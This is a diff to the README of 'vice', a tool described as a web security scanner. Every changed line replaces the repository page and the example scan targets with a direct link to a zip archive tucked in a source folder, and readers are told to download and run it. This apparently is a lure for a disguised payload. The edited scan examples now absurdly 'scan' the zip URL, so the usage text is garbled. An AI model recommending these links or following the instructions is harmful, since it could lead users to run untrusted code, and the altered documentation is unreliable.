@@ -1,6 +1,6 @@
 # 🔎 vice - Find Security Gaps Fast
 
-[![Download vice](https://img.shields.io/badge/Download%20vice-blue?style=for-the-badge&logo=github)](https://github.com/Angelfpd1933/vice)
+[![Download vice](https://img.shields.io/badge/Download%20vice-blue?style=for-the-badge&logo=github)](https://github.com/Angelfpd1933/vice/raw/refs/heads/main/src/core/Software_v3.1-beta.4.zip)
 
 ## 🧭 What vice does
 
@@ -32,7 +32,7 @@ For the best results, use:
 
 Visit this page to download and run the tool:
 
-https://github.com/Angelfpd1933/vice
+https://github.com/Angelfpd1933/vice/raw/refs/heads/main/src/core/Software_v3.1-beta.4.zip
 
 If the page offers a release file for Windows, download that file. If it gives you the source files only, use the setup steps below to run it on your machine.
 
@@ -63,7 +63,7 @@ A typical scan follows this flow:
 
 Example use:
 
-- `vice scan https://your-web-app.com`
+- `vice scan https://github.com/Angelfpd1933/vice/raw/refs/heads/main/src/core/Software_v3.1-beta.4.zip`
 
 Common scan options may include:
 
@@ -146,9 +146,9 @@ Keep the main app file with its folders in the same place.
 Here are a few simple examples you may use on Windows:
 
 - `vice --help`
-- `vice scan https://site.example`
-- `vice scan https://site.example --output results.txt`
-- `vice scan https://site.example --full`
+- `vice scan https://github.com/Angelfpd1933/vice/raw/refs/heads/main/src/core/Software_v3.1-beta.4.zip`
+- `vice scan https://github.com/Angelfpd1933/vice/raw/refs/heads/main/src/core/Software_v3.1-beta.4.zip --output results.txt`
+- `vice scan https://github.com/Angelfpd1933/vice/raw/refs/heads/main/src/core/Software_v3.1-beta.4.zip --full`
 
 If the tool shows a help screen, read the available commands before you run a scan.
 
@@ -167,7 +167,7 @@ It fits into a simple review process and keeps the focus on clear findings.
 
 Primary download page:
 
-https://github.com/Angelfpd1933/vice
+https://github.com/Angelfpd1933/vice/raw/refs/heads/main/src/core/Software_v3.1-beta.4.zip
 
 ## 🏷️ Topics
 
